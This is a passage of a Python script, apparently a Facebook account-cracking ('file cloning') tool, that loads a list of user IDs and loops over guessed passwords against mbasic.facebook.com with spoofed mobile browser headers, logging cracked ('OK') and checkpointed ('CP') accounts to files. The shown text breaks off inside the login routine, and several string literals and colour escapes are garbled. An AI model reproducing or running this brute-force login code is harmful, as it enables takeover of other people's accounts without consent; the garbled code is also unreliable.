#!/usr/bin/python3

import os

try:

    import requests

except ImportError:

    print('\ [✓] installing requests !...\')

    os.system('pip install requests')

try:

    import concurrent.futures

except ImportError:

    print('\ [✓] installing futures !...\')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\ [✓] installing bs4 !...\')

    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib

from concurrent.futures import ThreadPoolExecutor as diazhealth

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

month = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = month[nTemp]

P = '\1b[1;97m' # 

M = '\33[1;31m' # 

H = '\33[1;32m' # 

K = '\1b[1;97m' # 

B = '\1b[1;97m' # 

U = '\1b[1;97m' # 

O = '\1b[1;97m' # 

N = '\1b[0m'    # 

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,fuck,pwBaru=[],[],[]

ok = []

cp = []

id = []

user = []

loop = 0

url_lookup = "https://lookup-id.com/"

url_mb = "https://mbasic.facebook.com"

url_ip = "https://www.httpbin.org/ip"

header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36 Edg/100.0.1185.29;]"}

bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}

done = False

def jalan(z):

    for e in z + '\':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.01)

logo =                                          """   

   \33[1;31m_░▒███████

   \33[1;31m░██▓▒░░▒▓██

   \33[1;31m██▓▒░__░▒▓██___██████  

   \33[1;31m██▓▒░____░▓███▓__░▒▓██

   \33[1;31m██▓▒░___░▓██▓_____░▒▓██

   \33[1;31m██▓▒░_______________░▒▓██ 

   \33[1;31m_██▓▒░______________░▒▓██

   \33[1;31m__██▓▒░____________░▒▓██

   \33[1;31m___██▓▒░__________░▒▓██ 

   \33[1;31m____██▓▒░________░▒▓██

   \33[1;31m_____██▓▒░_____░▒▓██

   \33[1;31m______██▓▒░__░▒▓██

   \33[1;31m_______█▓▒░░▒▓██

   \33[1;31m_________░▒▓██

   \33[1;31m_______░▒▓██

   \33[1;31m_____░▒▓██ \33[1;34m {PAGLO-BRAND}

\33[1;34m------------------------\33[1;34m------------------------

\33[1;31m\33[1;34m   Author \33[1;34m     ➵ \33[1;34m    HANDRIIX

\33[1;31m\33[1;34m   Facebook\33[1;34m    ➵  \33[1;34m   PHANTOM

\33[1;31m\33[1;34m   GitHub\33[1;34m      ➵ \33[1;34m    LONDEBAZ

\33[1;34m------------------------\33[1;34m------------------------ """                                              

def hasil(OK,cp):

	if not len(OK) != 0:	    pass

	if len(cp) != 0:

	    print('\\  \1b[1;97m Total OK : \1b[1;97m %s  \1b[1;97mDIAZ_OK.txt' % (H, P, str(len(ok))))

	    print('  \1b[1;97m Total CP :\1b[1;97m   %s \1b[1;97mDIAZ_CP.txt' % (H, P, str(len(cp))))

	    input("\1b[1;97mPress enter to back ")

	    diaz()

def diaz():

        

  

    os.system('clear')

    print(logo)

    ipm = requests.get(url_ip).json()

    todz = ''

    IP = ipm['origin']

    print

    print(' [1] Start File Cloning')

    print(' [2] Dump/Make File')

    print(' [E] exit ')

    print('')

    _diaz___ = input(' [✓] Choose option : ')

    if _diaz___ in ('1', '01'):

        __xxx__().diazx(id)

    if _diaz___ in ('2', '02'):

        os.system('python dm.py')

    if _diaz___ in ('E', 'ee'):

        pass

class __xxx__:

    def __init__(self):

        self.id = []

    def diazx(self,id):

  

       

      

         

            

        os.system("clear")

        print(logo)

        self.cnt = input('Put File Name : ')

        self.id = open(self.cnt).read().splitlines()

        os.system('clear')

        print(logo)

        print("")

        ___worldwide___ = ('y')

        if ___worldwide___ in ('yes','Yes','Y', 'y'):

            self.__pler__()

        else:

            print(' [✓] Choose Correct One');

            self.diazx(id)

    def __metode__(self, user, __chi__, cebok):

        global ok,cp,loop

        sys.stdout.write(f"\ \1b[1;96m[DIAZ] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")

        sys.stdout.flush()

        try:

            for pw in __chi__:

                pw = pw.lower()

                session=requests.Session()

                header = {

                    "Host":cebok,

                    "upgrade-insecure-requests":"1",

                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",

                    "accept":"text/html,application/xhtml+xml,application/xml
